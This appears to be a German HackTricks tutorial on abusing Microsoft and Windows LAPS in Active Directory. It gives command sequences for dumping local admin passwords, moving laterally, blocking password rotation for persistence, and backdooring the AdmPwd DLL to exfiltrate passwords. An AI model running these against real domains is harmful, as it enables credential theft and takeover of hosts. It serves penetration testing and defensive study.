# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Es gibt derzeit **2 LAPS-Varianten**, die du bei einer Analyse antreffen kannst:

- **Legacy Microsoft LAPS**: speichert das lokale Administratorpasswort in **`ms-Mcs-AdmPwd`** und die Ablaufzeit in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (seit den April-2023-Updates in Windows integriert): kann weiterhin den Legacy-Modus emulieren, verwendet aber im nativen Modus **`msLAPS-*`**-Attribute, unterstützt **password encryption**, **password history** und **DSRM password backup** für Domain Controller.

LAPS ist dafür gedacht, **lokale Administratorpasswörter** zu verwalten, indem sie auf domain-joined Computern **eindeutig, randomisiert und häufig geändert** werden. Wenn du diese Attribute lesen kannst, kannst du in der Regel **als lokaler Admin pivoten** zum betroffenen Host. In vielen Umgebungen ist das Interessante nicht nur das Passwort selbst zu lesen, sondern auch herauszufinden, **wem der Zugriff** auf die Passwortattribute delegiert wurde.

### Legacy Microsoft LAPS attributes

In den Computerobjekten der Domain führt die Implementierung von Legacy Microsoft LAPS zur Hinzufügung von zwei Attributen:

- **`ms-Mcs-AdmPwd`**: **Administratorpasswort im Klartext**
- **`ms-Mcs-AdmPwdExpirationTime`**: **Passwortablaufzeit**

### Windows LAPS attributes

Native Windows LAPS fügt mehreren Computerobjekten neue Attribute hinzu:

- **`msLAPS-Password`**: Klartext-Passwort-Blob, als JSON gespeichert, wenn Verschlüsselung nicht aktiviert ist
- **`msLAPS-PasswordExpirationTime`**: geplante Ablaufzeit
- **`msLAPS-EncryptedPassword`**: verschlüsseltes aktuelles Passwort
- **`msLAPS-EncryptedPasswordHistory`**: verschlüsselte Passwort-Historie
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: verschlüsselte DSRM-Passwortdaten für Domain Controller
- **`msLAPS-CurrentPasswordVersion`**: GUID-basierte Versionsverfolgung, die von neuerer Rollback-Erkennungslogik verwendet wird (Windows Server 2025 forest schema)

Wenn **`msLAPS-Password`** lesbar ist, enthält der Wert ein JSON-Objekt mit dem Kontonamen, dem Update-Zeitpunkt und dem Klartext-Passwort, zum Beispiel:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Prüfen, ob aktiviert
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Du kannst die **raw LAPS policy** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` herunterladen und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser)-Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.

### Legacy Microsoft LAPS PowerShell cmdlets

Wenn das legacy LAPS module installiert ist, sind die folgenden cmdlets normalerweise verfügbar:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS wird mit einem neuen PowerShell-Modul und neuen cmdlets ausgeliefert:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Einige operative Details sind hier wichtig:

- **`Get-LapsADPassword`** behandelt automatisch **Legacy LAPS**, **Clear-Text Windows LAPS** und **Encrypted Windows LAPS**.
- Wenn das Passwort verschlüsselt ist und du es **lesen**, aber nicht **decrypt**en kannst, gibt das Cmdlet Metadaten wie **`Source`**, **`DecryptionStatus`** und **`AuthorizedDecryptor`** zurück, selbst wenn es das Clear-Text-Passwort nicht liefern kann.
- Bei **Encrypted Windows LAPS** sind **read permission** und **decrypt permission** **unterschiedliche Controls**. OU-/Objekt-Read-Access bedeutet nicht automatisch, dass du **`msLAPS-EncryptedPassword`** decrypt**en** kannst.
- **Password history** ist nur verfügbar, wenn **Windows LAPS encryption** aktiviert ist.
- Auf Domain Controllern kann die zurückgegebene Quelle **`EncryptedDSRMPassword`** sein.

Das ist bei einer Assessment nützlich, weil das Feld **`AuthorizedDecryptor`** dir sagt, **für welchen User oder welche Gruppe der Blob verschlüsselt wurde**. Dadurch wird aus einem fehlgeschlagenen Passwort-Leseversuch oft ein neues Privilege-Escalation-Ziel.

### PowerView / LDAP

**PowerView** kann auch verwendet werden, um herauszufinden, **wer das Passwort lesen kann und es zu lesen**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Wenn **`msLAPS-Password`** lesbar ist, parse das zurückgegebene JSON und extrahiere **`p`** für das Passwort und **`n`** für den verwalteten lokalen Admin-Kontonamen.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Dieses **`n`**-Feld ist bei neueren Deployments wichtig, weil die **automatische Kontoverwaltung von Windows LAPS** ein **benutzerdefiniertes Konto** statt des eingebauten **`Administrator`** anvisieren kann, und neuere **Windows 11 24H2 / Windows Server 2025**-Systeme diesen Kontonamen sogar **randomisieren** können.

### Linux / remote tooling

Moderne Tooling unterstützt sowohl das ältere Microsoft LAPS als auch Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Hinweise:

- Neuere **NetExec**-Builds unterstützen **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** und **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** ist weiterhin nützlich für **legacy Microsoft LAPS** unter Linux, zielt aber nur auf **`ms-Mcs-AdmPwd`** ab.
- Neuere plattformübergreifende Tools wie **`LAPS4LINUX`**, **`dpapi-ng`**-basierte Tools und aktuelle **NetExec**-Workflows können auch **native Windows LAPS** von Nicht-Windows-Hosts aus verarbeiten.
- Wenn die Umgebung **encrypted Windows LAPS** verwendet, reicht ein einfacher LDAP-Read nicht aus; du musst außerdem ein **authorized decryptor** sein (oder äquivalentes Entschlüsselungsmaterial besitzen, z. B. offline domain DPAPI-NG root key material).
- Auf **Windows 11 24H2 / Windows Server 2025** solltest du nicht annehmen, dass der verwaltete lokale Admin immer **`Administrator`** ist. Die automatische Kontoverwaltung kann ein benutzerdefiniertes Konto erstellen und optional dessen Namen randomisieren, daher solltest du zuerst den Kontonamen über **`n`** / **`Account`** ermitteln, bevor du **`--laps`** in großem Maßstab verwendest.

### Directory synchronization abuse

Wenn du statt direktem Lesezugriff auf jedes Computerobjekt Rechte auf Domain-Ebene für **directory synchronization** hast, kann LAPS trotzdem interessant sein.

Die Kombination aus **`DS-Replication-Get-Changes`** mit **`DS-Replication-Get-Changes-In-Filtered-Set`** oder **`DS-Replication-Get-Changes-All`** kann verwendet werden, um **confidential / RODC-filtered** Attribute wie das legacy **`ms-Mcs-AdmPwd`** zu synchronisieren. BloodHound modelliert dies als **`SyncLAPSPassword`**. Siehe [DCSync](dcsync.md) für den Hintergrund zu den Replikationsrechten.

## LAPSToolkit

Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Enumeration von LAPS mit mehreren Funktionen.\
Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktiviertem LAPS.** Dadurch werden **Gruppen** angezeigt, die explizit damit **betraut wurden, LAPS-Passwörter zu lesen**, und das sind oft Benutzer in geschützten Gruppen.\
Ein **Konto**, das einen Computer einer Domäne **beigetreten** hat, erhält `All Extended Rights` über diesen Host, und dieses Recht gibt dem **Konto** die Möglichkeit, **Passwörter zu lesen**. Die Enumeration kann ein Benutzerkonto anzeigen, das das LAPS-Passwort auf einem Host lesen kann. Das kann uns dabei helfen, **spezifische AD-Benutzer zu identifizieren**, die LAPS-Passwörter lesen können.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Wenn du keine interaktive PowerShell hast, kannst du dieses Privileg remote über LDAP missbrauchen:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Dieses dump alle LAPS-Secrets, die der Benutzer lesen kann, und ermöglicht es dir, dich lateral mit einem anderen lokalen Administratorpasswort zu bewegen.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Ablaufdatum

Sobald man Admin ist, ist es möglich, die **Passwörter zu erhalten** und zu **verhindern**, dass eine Maschine ihr **Passwort** **aktualisiert**, indem man das **Ablaufdatum in die Zukunft setzt**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS verwendet stattdessen **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Das Passwort wird weiterhin rotiert, wenn ein **admin** **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** verwendet, oder wenn **Do not allow password expiration time longer than required by policy** aktiviert ist.

### Snapshot rollback caveat on newer Windows LAPS

Ältere Snapshot- / Image-Rollback-Tricks sind bei aktuellen **Windows LAPS**-Deployments **weniger zuverlässig**. Auf **Windows 11 24H2 / Windows Server 2025** vergleicht der Client, wenn das Forest-Schema **`msLAPS-CurrentPasswordVersion`** enthält (**Windows Server 2025 forest schema**), eine lokal zwischengespeicherte GUID mit dem in AD gespeicherten Wert und rotiert das Passwort **sofort**, wenn ein Rollback einen **torn state** erzeugt.

In der Praxis bedeutet das, dass Snapshot-basierte Persistence oder Versuche, ein älteres bekanntes lokales admin-Passwort wiederzubeleben, schnell auffliegen können, statt bis zum nächsten normalen Ablauf zu überleben.

Dieser Schutz gilt nur für **AD-backed Windows LAPS** und hängt weiterhin davon ab, dass die zurückgesetzte Maschine sich wieder bei **AD authentifizieren** kann. Wenn die Maschine nicht mehr mit AD sprechen kann, können **password history** oder **AD backup access** dennoch helfen.

### Automatic account management tamper caveat

Wenn **automatic account management** aktiviert ist, verwaltet Windows LAPS den Lebenszyklus des verwalteten lokalen admin-Kontos. Unerwartete Versuche, dieses Konto umzubenennen, neu zu konfigurieren oder anderweitig zu manipulieren, können mit **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** abgelehnt werden, daher ist Persistence, die davon abhängt, das verwaltete LAPS-Konto unbemerkt zu verändern, auf neueren Endpoints weniger zuverlässig.

### Recovering historical passwords from AD backups

Wenn **Windows LAPS encryption + password history** aktiviert ist, können eingehängte AD-Backups zu einer zusätzlichen Quelle für secrets werden. Wenn du auf einen eingehängten AD-Snapshot zugreifen und den **recovery mode** verwenden kannst, kannst du ältere gespeicherte Passwörter abfragen, ohne mit einem aktiven DC zu sprechen.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Dies ist meist relevant bei **AD backup theft**, **offline forensics abuse** oder **disaster-recovery media access**.

### Backdoor

Der ursprüngliche Quellcode für Legacy Microsoft LAPS ist [hier](https://github.com/GreyCorbel/admpwd) zu finden, daher ist es möglich, eine Backdoor in den Code einzubauen (zum Beispiel innerhalb der Methode `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`), die irgendwie **neue Passwörter exfiltriert oder sie irgendwo speichert**.

Dann kompiliere die neue `AdmPwd.PS.dll` und lade sie auf die Maschine nach `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hoch (und ändere die Änderungszeit).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
